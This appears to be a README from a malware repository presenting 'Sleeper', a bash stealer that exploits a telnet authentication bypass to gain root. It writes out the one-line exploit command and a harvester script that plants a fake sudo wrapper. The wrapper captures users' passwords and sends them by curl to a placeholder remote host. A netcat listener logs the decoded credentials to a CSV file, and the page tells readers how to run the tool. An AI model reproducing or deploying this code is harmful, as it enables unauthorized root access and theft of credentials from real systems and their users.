<p align="left">
  <a href="../readme.md">⬅ Back</a>
</p>

This is **Sleeper**, the 2 stage malware written in bash. This malware abuses the [CVE-2026-24061](https://nvd.nist.gov/vuln/detail/cve-2026-24061) critical telnet vulnerability which once abused gives an instant root shell onto the machine. You could maybe count in the vulnerability abuse as the 3rd component but its just a line of code, so up to you.  
```bash
USER="-f root" telnet -a 127.0.0.1
```

Anyhow, this malware gets the instant access via abusing a bad authentication done by the telnet server component. Once that is done the script deploys the harvester which concatenates the new script $PATH onto the existing $PATH for a sudo wrapper it is deploying. I guess if I had to name what it actually is: dormant stealer malware.  

The sudo wrapper, what it does is it mimics the way real sudo acts, however it fails on the first time on purpose and asks the user to provide credentials to authenticate again. On the first attempt it always fails (could make it not fail I guess) and it sends out the credentials to the harvester server. On the second try, should the user succeed they run their program with superuser privileges. The harvester server logs it and it keeps listening.  


You can run this malicious software by fixing a few bugs, pasting some IPs and running:

```bash
/bin/bash sleeper.sh
```

You can find the source [here](sleeper.sh)

This is the harvester mechanism
```bash
(
    sleep 3
    echo "echo '[INFO] Deploying sudo harvester...'"

    echo "cat > /usr/local/bin/sudo << 'WRAP'"
    echo "#!/bin/bash"
    echo "echo -n \"[sudo] password for \$(whoami): \""
    echo "read -s pass"
    echo "echo \"\""
    echo "curl -su \"\$(whoami):\$pass\" -o /dev/null \"http://REPLACE_ME//://REPLACE_ME//\" 2>/dev/null || true"
    echo "echo \"Sorry, try again.\""
    echo "exec /usr/bin/sudo \"\$@\""
    echo "WRAP"

    echo "chmod 755 /usr/local/bin/sudo"


    echo "cat > /etc/profile.d/zz-sudo-path.sh << 'PATH'"
    echo "export PATH=\"/usr/local/bin:/usr/local/sbin:\$PATH\""
    echo "PATH"

    echo "chmod 644 /etc/profile.d/zz-sudo-path.sh"
    echo "echo '[DONE] Harvester deployed successfully!'"
    echo "exit"

) | USER="-me root" telnet -a "$VICTIM" #the exploit part
```

This is merely just a listener that puts stuff into the csv file named hits.csv 
```bash
while true; do
    auth=$(nc -l -p "$PORT" -k 2>/dev/null | grep -i '^Authorization: Basic ' | head -1)
    
    if [[ -n "$auth" ]]; then
        b64=$(echo "$auth" | sed 's/.*Basic //' | tr -d '\r\n ')
        decoded=$(echo "$b64" | base64 -d 2>/dev/null)
        
        if [[ $? -eq 0 && "$decoded" == *:* ]]; then
            ts=$(date '+%H:%M:%S')
            echo "$VICTIM,$decoded,$ts" >> hits.csv
            echo "[INFO] HIT -> $decoded [$ts]"
        fi
    fi
    sleep 0.3
done
```



<p align="left">
  <a href="../README.md">⬅ Back</a>
</p>